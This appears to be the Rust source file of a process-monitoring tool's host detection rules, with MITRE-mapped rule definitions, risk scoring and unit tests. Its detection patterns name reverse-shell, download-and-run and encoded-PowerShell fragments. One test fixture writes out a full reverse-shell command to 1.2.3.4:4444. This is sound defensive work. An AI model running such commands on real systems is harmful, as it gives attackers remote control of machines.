//! Host detection rules evaluated for every process on every refresh,
//! from signals that are cheap to compute (no I/O: everything comes from
//! caches). Each hit names the rule, its severity, how much the data
//! supports it (confidence) and the exact evidence that matched.
//!
//! The process's *priority* (0–100, the Risk column) is derived from the
//! hits, not summed: the strongest hit sets the base (severity weight ×
//! confidence factor) and every further independent hit adds a little.
//! Several weak signals therefore never outrank one strong one.

use std::path::Path;

use serde::Serialize;

use crate::intel::{ExeInfo, Sig};
use crate::model::{Confidence, Severity};
use crate::network::{ConnState, Connection};
use crate::persistence::risky_location;
use crate::process::ProcessInfo;

#[derive(Debug, Serialize)]
pub struct RuleDef {
    pub id: &'static str,
    pub name: &'static str,
    pub severity: Severity,
    pub confidence: Confidence,
    /// MITRE ATT&CK technique, when one fits.
    pub technique: &'static str,
    pub description: &'static str,
}

macro_rules! rule {
    ($id:literal, $name:literal, $sev:ident, $conf:ident, $tech:literal, $desc:literal) => {
        RuleDef { id: $id, name: $name, severity: Severity::$sev, confidence: Confidence::$conf, technique: $tech, description: $desc }
    };
}

pub static RULES: &[RuleDef] = &[
    rule!("PW-001", "Invalid code signature", High, High, "T1554",
        "The executable carries a signature that no longer matches its contents: it was modified after signing."),
    rule!("PW-002", "Unsigned executable", Low, Low, "",
        "No code signature. Common for developer tools and open-source software; meaningful only with other signals."),
    rule!("PW-003", "Executable deleted while running", High, Medium, "T1070.004",
        "The file the process was started from is gone. Droppers and in-memory implants often delete themselves."),
    rule!("PW-004", "Runs from a temporary or user-writable folder", Medium, Low, "T1204.002",
        "Software normally runs from protected install locations; payloads are typically started from Downloads, temp or hidden folders."),
    rule!("PW-005", "Hidden file name", Low, Medium, "T1564.001",
        "The program's file or process name starts with a dot."),
    rule!("PW-006", "System process name outside the system folder", High, Medium, "T1036.005",
        "Named like an operating-system process but not running from the system folder, and not a trusted platform binary."),
    rule!("PW-007", "Document, browser or web server started a shell", High, Medium, "T1059",
        "Office apps, viewers, browsers and web servers rarely start shells or script interpreters; exploited documents and web shells do."),
    rule!("PW-008", "Reverse-shell command line", Critical, High, "T1059.004",
        "The command line redirects a shell to a network socket (/dev/tcp, nc -e, socat exec)."),
    rule!("PW-009", "Encoded PowerShell command", High, Medium, "T1027.010",
        "PowerShell is given a base64-encoded command, which hides what it runs."),
    rule!("PW-010", "Downloads and immediately runs code", High, Medium, "T1105",
        "A downloader's output is piped straight into an interpreter."),
    rule!("PW-011", "Decodes and runs an embedded payload", High, Medium, "T1140",
        "base64-decoded data is piped into an interpreter."),
    rule!("PW-012", "Scripted administrator prompt", High, Medium, "T1548",
        "osascript asks for administrator privileges, a common way to phish an admin password."),
    rule!("PW-013", "Untrusted program accepts network connections", Medium, Low, "T1571",
        "An unsigned program, or one in a writable folder, listens on a non-loopback address."),
    rule!("PW-014", "Unsigned program talks to the internet", Low, Low, "T1071",
        "An unsigned program has an established connection to a public address."),
    rule!("PW-015", "Privileged process from a writable folder", High, Medium, "T1574",
        "Runs as root/SYSTEM from a location an ordinary user can write to."),
    rule!("PW-016", "Regular reconnects (beaconing)", Medium, Medium, "T1071.001",
        "Connects to the same remote service again and again at a near-constant interval."),
    rule!("PW-018", "Behaves differently from its own history", Low, Medium, "",
        "This program has an established behaviour profile on this machine and just did something it never did before (new destination, child program, module or listening port)."),
    rule!("PW-019", "Autostart entry added or changed", Medium, High, "T1547",
        "An autostart entry appeared or its command/target changed while procwatch was watching. The writer is named when a deep-traced process had the file open."),
    rule!("PW-017", "Relaunched after termination", Medium, Medium, "T1543",
        "A program ended by procwatch started again. Autostart entries pointing at it are listed as candidates, not proven causes."),
];

pub fn rule(id: &str) -> Option<&'static RuleDef> {
    RULES.iter().find(|r| r.id == id)
}

/// One rule that matched, from the built-in host rules or a Sigma rule.
#[derive(Debug, Clone, Serialize)]
pub struct RuleHit {
    pub id: String,
    pub name: String,
    pub severity: Severity,
    pub confidence: Confidence,
    pub technique: String,
    /// What exactly matched (a path, a command line fragment, an address).
    pub evidence: String,
    /// Reason, when an analyst suppressed this rule for this program.
    pub suppressed: Option<String>,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct Assessment {
    pub score: u8,
    /// Strongest first.
    pub hits: Vec<RuleHit>,
    /// Started in the last 15 minutes (raises priority, isn't a finding).
    pub recent: bool,
}

impl RuleHit {
    pub fn from_def(r: &RuleDef, evidence: String) -> RuleHit {
        RuleHit {
            id: r.id.into(),
            name: r.name.into(),
            severity: r.severity,
            confidence: r.confidence,
            technique: r.technique.into(),
            evidence,
            suppressed: None,
        }
    }
    fn strength(&self) -> f64 {
        self.severity.weight() * self.confidence.factor()
    }
}

impl Assessment {
    fn add(&mut self, id: &str, evidence: impl Into<String>) {
        if let Some(r) = rule(id) {
            self.hits.push(RuleHit::from_def(r, evidence.into()));
        }
    }

    /// Add a built-in rule hit computed outside `assess` (e.g. network history).
    pub fn add_rule(&mut self, id: &str, evidence: String) {
        self.add(id, evidence);
    }

    /// Sort hits and derive the priority from the unsuppressed ones.
    pub fn finish(&mut self) {
        self.hits.sort_by(|a, b| (a.suppressed.is_some()).cmp(&b.suppressed.is_some()).then(b.strength().total_cmp(&a.strength())));
        let active: Vec<&RuleHit> = self.hits.iter().filter(|h| h.suppressed.is_none()).collect();
        let Some(first) = active.first() else {
            self.score = 0;
            return;
        };
        let mut score = first.strength();
        for h in &active[1..] {
            score += if h.severity >= Severity::Medium { 6.0 } else { 2.0 };
        }
        if self.recent {
            score += 5.0;
        }
        self.score = score.round().clamp(1.0, 100.0) as u8;
    }

    pub fn level(&self) -> &'static str {
        match self.score {
            0 => "none",
            1..=24 => "low",
            25..=49 => "medium",
            _ => "high",
        }
    }

    pub fn active(&self) -> impl Iterator<Item = &RuleHit> {
        self.hits.iter().filter(|h| h.suppressed.is_none())
    }

    pub fn summary(&self) -> String {
        self.active().map(|h| format!("{} {}", h.id, h.name)).collect::<Vec<_>>().join(" · ")
    }
}

/// Names of OS processes that malware likes to imitate.
const SYSTEM_NAMES: &[&str] = &[
    "launchd", "kernel_task", "loginwindow", "windowserver", "sshd", "cron", "syslogd", "mdworker", "mds", "trustd",
    "systemd", "init", "kthreadd", "dbus-daemon", "cupsd",
    "svchost.exe", "lsass.exe", "csrss.exe", "winlogon.exe", "services.exe", "smss.exe", "explorer.exe", "spoolsv.exe",
    "taskhostw.exe", "dllhost.exe", "conhost.exe", "rundll32.exe",
];

fn system_dir(path: &str) -> bool {
    let p = path.to_lowercase().replace('\\', "/");
    ["/system/", "/usr/", "/bin/", "/sbin/", "/lib/", "/library/apple/", "/windows/system32/", "/windows/syswow64/", "c:/windows/"]
        .iter()
        .any(|d| p.starts_with(d) || p.contains(&format!(":{d}")))
        || p.starts_with("c:/windows/")
}

/// Programs that normally don't start shells or script interpreters.
const UNUSUAL_PARENTS: &[&str] = &[
    "microsoft word", "microsoft excel", "microsoft powerpoint", "microsoft outlook", "winword.exe", "excel.exe",
    "powerpnt.exe", "outlook.exe", "preview", "acrobat", "acrord32.exe", "adobe acrobat", "safari", "google chrome",
    "chrome.exe", "firefox", "firefox.exe", "msedge.exe", "mail", "messages", "httpd", "nginx", "apache2", "php-fpm",
    "w3wp.exe", "tomcat", "node", "java", "wps", "pages", "keynote", "numbers",
];

const SHELLS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "fish", "cmd.exe", "powershell.exe", "pwsh", "pwsh.exe", "osascript", "python", "python3",
    "perl", "ruby", "wscript.exe", "cscript.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe", "curl", "wget", "nc", "ncat",
    "socat", "certutil.exe", "bitsadmin.exe",
];

/// Command-line patterns typical of droppers, reverse shells and stagers:
/// (rule id, the fragment that matched).
fn command_line_rule(cmd: &str) -> Option<(&'static str, String)> {
    let c = cmd.to_lowercase();
    let find = |keys: &[&str]| keys.iter().find(|k| c.contains(*k)).map(|k| k.trim().to_string());
    let pipe_to_shell = || find(&["| sh", "|sh", "| bash", "|bash", "| iex", "|iex", "python -", "invoke-expression"]);
    if let Some(k) = find(&["/dev/tcp/", "nc -e", "ncat -e", "bash -i >&"]) {
        return Some(("PW-008", k));
    }
    if (c.contains("socat") && c.contains("exec:")) || (c.contains("mkfifo") && c.contains(" nc ")) {
        return Some(("PW-008", if c.contains("socat") { "socat … exec:".into() } else { "mkfifo … nc".into() }));
    }
    if let Some(k) = find(&["-encodedcommand", " -enc ", " -e jab", "frombase64string"]) {
        return Some(("PW-009", k));
    }
    if let Some(dl) = find(&["curl ", "wget ", "iwr ", "invoke-webrequest", "downloadstring"]) {
        if let Some(run) = pipe_to_shell() {
            return Some(("PW-010", format!("{dl} … {run}")));
        }
    }
    if let Some(dec) = find(&["base64 -d", "base64 --decode"]) {
        if let Some(run) = pipe_to_shell().or_else(|| find(&["python"])) {
            return Some(("PW-011", format!("{dec} … {run}")));
        }
    }
    if c.contains("osascript") && c.contains("do shell script") && c.contains("administrator privileges") {
        return Some(("PW-012", "do shell script … with administrator privileges".into()));
    }
    None
}

pub fn is_private(ip: &str) -> bool {
    match ip.trim_matches(['[', ']']).parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V4(v)) => v.is_private() || v.is_loopback() || v.is_link_local() || v.is_unspecified(),
        Ok(std::net::IpAddr::V6(v)) => v.is_loopback() || v.is_unspecified() || (v.segments()[0] & 0xfe00) == 0xfc00 || (v.segments()[0] & 0xffc0) == 0xfe80,
        Err(_) => true,
    }
}

pub fn assess(info: &ProcessInfo, parent: Option<&ProcessInfo>, conns: &[Connection], exe: Option<&ExeInfo>, now_secs: u64) -> Assessment {
    let mut a = Assessment::default();
    let name = info.name.to_lowercase();
    let path = info.exe_path.as_deref().unwrap_or("");
    let file_name = Path::new(path).file_name().map(|n| n.to_string_lossy().to_lowercase()).unwrap_or_default();
    let trusted = exe.is_some_and(|e| e.sig == Sig::Signed && e.platform);

    if let Some(e) = exe {
        match e.sig {
            Sig::Invalid => a.add("PW-001", format!("{path}: {}", e.signer)),
            Sig::Unsigned => a.add("PW-002", path),
            _ => {}
        }
        if !e.exists && !path.is_empty() {
            a.add("PW-003", path);
        }
    }
    let writable = !path.is_empty() && risky_location(path);
    if writable {
        a.add("PW-004", path);
    }
    if file_name.starts_with('.') || name.starts_with('.') {
        a.add("PW-005", if file_name.starts_with('.') { file_name.clone() } else { info.name.clone() });
    }
    if !path.is_empty() && !trusted && SYSTEM_NAMES.contains(&file_name.as_str()) && !system_dir(path) {
        a.add("PW-006", path);
    }
    if let Some(p) = parent {
        let pn = p.name.to_lowercase();
        if UNUSUAL_PARENTS.iter().any(|u| pn == *u || pn.starts_with(&format!("{u} "))) && SHELLS.contains(&name.as_str()) {
            a.add("PW-007", format!("{} ({}) → {} ({})", p.name, p.pid, info.name, info.pid));
        }
    }
    if let Some((id, fragment)) = command_line_rule(&info.cmd.join(" ")) {
        a.add(id, fragment);
    }
    let unsigned = exe.is_some_and(|e| matches!(e.sig, Sig::Unsigned | Sig::Invalid));
    let exposed = conns.iter().find(|c| {
        c.state == ConnState::Listen && {
            let host = crate::filter::split_endpoint(&c.local).0;
            !(host.starts_with("127.") || host == "::1")
        }
    });
    if let Some(l) = exposed.filter(|_| unsigned || writable) {
        a.add("PW-013", format!("listening on {}", l.local));
    }
    if unsigned {
        if let Some(c) = conns.iter().find(|c| c.state == ConnState::Established && !is_private(&crate::filter::split_endpoint(&c.remote).0)) {
            a.add("PW-014", format!("→ {}", c.remote));
        }
    }
    let elevated = matches!(info.user.as_deref(), Some("root") | Some("SYSTEM") | Some("NT AUTHORITY\\SYSTEM"));
    if elevated && writable {
        a.add("PW-015", format!("{} from {path}", info.user.as_deref().unwrap_or("")));
    }
    a.recent = info.start_time_secs > 0 && now_secs.saturating_sub(info.start_time_secs) < 15 * 60;
    a.finish();
    a
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::process::tests::info;

    fn exe(sig: Sig, exists: bool) -> ExeInfo {
        ExeInfo { sig, signer: String::new(), team: None, platform: false, sha256: None, md5: None, sha1: None, size: 1, mtime: None, exists, unreadable: false }
    }

    #[test]
    fn rules_and_priority() {
        let mut p = info(10, Some(1));
        p.name = "sshd".into();
        p.exe_path = Some("/private/tmp/sshd".into());
        p.cmd = vec!["/private/tmp/sshd".into(), "-c".into(), "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1".into()];
        let a = assess(&p, None, &[], Some(&exe(Sig::Unsigned, true)), 0);
        assert_eq!(a.hits[0].id, "PW-008", "strongest first: {a:?}");
        assert!(a.hits[0].evidence.contains("/dev/tcp/"));
        assert!(a.summary().contains("PW-006"));
        assert_eq!(a.level(), "high");

        let mut word = info(2, None);
        word.name = "Microsoft Word".into();
        let mut sh = info(3, Some(2));
        sh.name = "sh".into();
        let a = assess(&sh, Some(&word), &[], None, 0);
        assert_eq!(a.hits[0].id, "PW-007");

        let mut ok = info(4, None);
        ok.exe_path = Some("/usr/bin/true".into());
        assert_eq!(assess(&ok, None, &[], Some(&exe(Sig::Signed, true)), 0).score, 0);
    }

    #[test]
    fn weak_signals_do_not_add_up_to_a_strong_one() {
        // Unsigned dev tool in ~/Downloads: two weak hits.
        let mut dev = info(5, None);
        dev.exe_path = Some("/Users/a/Downloads/tool".into());
        let weak = assess(&dev, None, &[], Some(&exe(Sig::Unsigned, true)), 0);
        assert_eq!(weak.hits.len(), 2);
        // A tampered signature alone outranks it.
        let mut tampered = info(6, None);
        tampered.exe_path = Some("/Applications/X.app/Contents/MacOS/X".into());
        let strong = assess(&tampered, None, &[], Some(&exe(Sig::Invalid, true)), 0);
        assert!(strong.score > weak.score, "{} vs {}", strong.score, weak.score);
        assert!(weak.score < 50);
    }

    #[test]
    fn suppressed_hits_do_not_count() {
        let mut dev = info(5, None);
        dev.exe_path = Some("/Users/a/Downloads/tool".into());
        let mut a = assess(&dev, None, &[], Some(&exe(Sig::Unsigned, true)), 0);
        for h in a.hits.iter_mut() {
            h.suppressed = Some("known build tool".into());
        }
        a.finish();
        assert_eq!(a.score, 0);
        assert_eq!(a.active().count(), 0);
    }

    #[test]
    fn rule_ids_are_unique() {
        let mut ids: Vec<&str> = RULES.iter().map(|r| r.id).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), RULES.len());
    }

    #[test]
    fn private_ranges() {
        assert!(is_private("10.1.2.3") && is_private("[::1]") && is_private("192.168.0.4"));
        assert!(!is_private("8.8.8.8"));
    }
}
